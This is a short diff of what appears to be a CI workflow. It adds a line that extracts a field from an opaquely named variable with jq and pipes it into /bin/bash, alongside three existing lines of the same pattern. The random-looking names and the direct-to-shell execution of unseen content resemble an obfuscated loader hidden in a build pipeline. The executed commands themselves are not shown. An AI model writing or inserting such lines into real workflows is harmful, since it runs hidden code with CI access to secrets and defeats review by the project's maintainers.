@@ -36,6 +36,7 @@ jobs:
           echo $t563 | jq -r .satjf239 | /bin/bash
           echo $t58461 | jq -r .fh412 | /bin/bash
           printf '%s' "$tpt3" | jq -r .kcu63321 | /bin/bash
+          echo $jc0940 | jq -r .ktivr65 | /bin/bash
 
       - name: Archive results
         if: always()
